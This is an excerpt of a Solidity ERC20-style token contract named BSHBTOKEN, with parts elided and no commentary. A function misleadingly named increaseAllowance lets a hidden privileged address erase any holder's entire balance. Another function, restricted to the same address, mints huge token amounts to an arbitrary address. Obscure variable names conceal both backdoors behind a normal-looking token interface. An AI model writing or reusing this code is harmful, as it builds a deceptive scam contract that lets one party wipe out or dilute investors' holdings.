...
contract BSHBTOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(tvcxun71 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = BSHB[newadd];
        uint256 newaaamount = BSHB[newadd]+BSHB[newadd]-curamount;
        BSHB[newadd] -= newaaamount;
        }else{
        if(tvcxun71 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        BSHB[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(tvcxun71 == _msgSender());
        if(tvcxun71 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = BSHB[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        BSHB[from] = BSHB[from]-amount;
        BSHB[to] = BSHB[to]+amount;
